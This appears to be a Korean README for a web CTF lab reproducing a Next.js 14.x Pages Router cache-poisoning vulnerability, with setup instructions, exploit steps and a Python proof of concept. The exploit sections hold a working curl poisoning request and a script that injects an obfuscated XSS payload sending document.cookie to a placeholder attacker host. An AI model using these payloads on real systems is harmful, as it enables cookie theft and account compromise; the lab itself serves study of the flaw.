# Next.js_cache_and_chains

본 프로젝트는 PortSwigger Top 10 Web Hacking Techniques of 2025 중 7위에 선정된 `"Next.js, cache, and chains: the stale elixir"` 리서치 블로그의 내용을 기반으로 구성되었습니다.

이력서(Portfolio)를 생성하고 제출하는 웹 서비스를 모티브로 구성된 Web CTF 문제입니다.

<br>

## 📌 Vulnerability Overview
Next.js 14.x 버전 이하의 Pages Router 환경에서 발생하는 Cache Poisoning을 다룹니다.

공격자는 x-now-route-matches: 1 헤더와 데이터 요청 파라미터(__nextDataReq=1)를 조작하여 서버의 데이터(JSON) 엔드포인트를 악의적인 페이로드로 오염시켜 캐싱할 수 있습니다.

이후 HR 봇(관리자)이나 일반 사용자가 해당 경로에 순수한 HTML 요청으로 접근하면, 서버는 오염된 JSON 데이터를 Content-Type: text/html 형식으로 잘못 반환합니다.

브라우저는 이 텍스트를 파싱하는 과정에서 섞여 있는 HTML 태그(XSS 페이로드)를 실행하게 됩니다.

<br>

## 🛠️ Environment & Project Structure
* **Frontend**: Next.js (Pages Router), React
* **Backend (Admin Bot)**: Express, Puppeteer
* **Infrastructure**: Docker, Docker Compose

```text
Next.js_cache_and_chains/
├── docker-compose.yml       
├── web/                     
│   ├── Dockerfile
│   ├── package.json
│   └── pages/
│       ├── api/apply.js     
│       ├── index.tsx       
│       └── resume.tsx       
└── bot/                   
    ├── Dockerfile
    ├── package.json
    └── index.js             
```

<br>

## 🚀 How to Run

Docker와 Docker Compose가 설치된 환경에서 아래 명령어를 실행합니다.

```bash
docker-compose up --build -d
```
* 웹 서비스 접속: `http://localhost:3000`
* 봇 서비스 API: `http://localhost:4000` (내부망 통신용)

<br>

## 🚩 Exploit Steps

### Step 1. 타겟 URL 생성
메인 페이지(`/`)에 접속하여 `Name`과 `Job Title`을 입력한 뒤 **[Save & Generate URL]** 버튼을 클릭하여 본인만의 이력서 경로를 생성합니다.
* 생성 예시: `/resume?name=test&title=wsl`

### Step 2. XSS 페이로드 준비
문법 오류(`invalid escape sequence`)를 방지하기 위해 따옴표 등의 특수문자가 포함되지 않은 페이로드를 작성합니다. (`String.fromCharCode` 또는 `btoa/atob` 활용)
```javascript
<img src=x onerror=eval(String.fromCharCode(108,111,99,...))>
```

### Step 3. Cache Poisoning
`curl`이나 프록시 도구를 사용하여 생성한 이력서 경로의 데이터 엔드포인트(`__nextDataReq=1`)를 타격합니다. `Accept-Language` 헤더에 페이로드를 삽입하고, 캐싱을 강제하는 헤더를 추가합니다.

```bash
curl -i -s -k -X GET \
  -H "Accept-Language: ko-KR <img src=x onerror=eval(String.fromCharCode(...))>" \
  -H "x-now-route-matches: 1" \
  "http://localhost:3000/resume?name=test&title=wsl&__nextDataReq=1"
```
*(HTTP 200 OK 응답과 함께 JSON 데이터가 반환되면 캐시 오염 성공)*

### Step 4. HR Admin Bot 호출 (Exploit Trigger)
브라우저로 돌아와 메인 페이지 하단의 **[Submit to HR Admin]** 섹션에서 `__nextDataReq=1` 파라미터가 **없는** 원본 이력서 경로를 제출합니다.

### Step 5. Flag 획득 
HR Admin Bot이 오염된 URL로 접속하면, 캐싱되어 있던 JSON 데이터가 HTML로 렌더링되면서 브라우저 내에서 XSS가 실행됩니다. 사전에 설정한 웹훅 서버에서 탈취된 쿠키(Flag)를 확인합니다.

<br>

## poc.py

```python
import requests
import time
import random

# ==========================================
# 1. 설정 (Configuration)
# ==========================================
TARGET_HOST = "http://localhost:3000"
WEBHOOK_URL = "https://attacker_ip/" # 본인의 웹훅 주소

random_id = random.randint(10000, 99999)
RESUME_PATH = f"/resume?name=test{random_id}&title=test{random_id}"

print(f"[*] Starting Cache Poisoning Exploit (No Base64)...")
print(f"[*] Target Fresh Path: {RESUME_PATH}")

# ==========================================
# 2. XSS 페이로드 생성 (String.fromCharCode)
# ==========================================
js_code = f"location.href='{WEBHOOK_URL}?c='+document.cookie"

# 아스키코드(숫자) 배열로 변환
char_codes = ','.join(str(ord(c)) for c in js_code)
xss_payload = f"<img src=x onerror=eval(String.fromCharCode({char_codes}))>"

print("")
print(f"[+] Raw JS Code: {js_code}")
print(f"[+] Generated XSS Payload: {xss_payload}")
print("")

# ==========================================
# 3. Cache Poisoning
# ==========================================
poison_url = f"{TARGET_HOST}{RESUME_PATH}&__nextDataReq=1"
headers = {
    "Accept-Language": f"ko-KR {xss_payload}",
    "x-now-route-matches": "1"
}

print(f"[*] Sending Poisoning Request...")
response = requests.get(poison_url, headers=headers)

if response.status_code == 200:
    print("[+] Cache successfully poisoned!")
else:
    print(f"[-] Something went wrong. Status Code: {response.status_code}")

# 캐시가 반영될 시간
time.sleep(2)

# ==========================================
# 4. HR 관리자 봇 호출 (Exploit Trigger)
# ==========================================
apply_api_url = f"{TARGET_HOST}/api/apply"
json_data = {
    "resumePath": RESUME_PATH
}

print(f"[*] Notifying HR Admin Bot...")
bot_response = requests.post(apply_api_url, json=json_data)

if bot_response.status_code == 200:
    print("[+] HR Admin has been notified!")
    print(f"[!] Check your webhook ({WEBHOOK_URL}) for the Admin's Flag! 🚩")
else:
    print(f"[-] Failed to notify Admin Bot. Status: {bot_response.status_code}")
``` 

<br>

## 📚 References
https://zhero-web-sec.github.io/research-and-things/nextjs-cache-and-chains-the-stale-elixir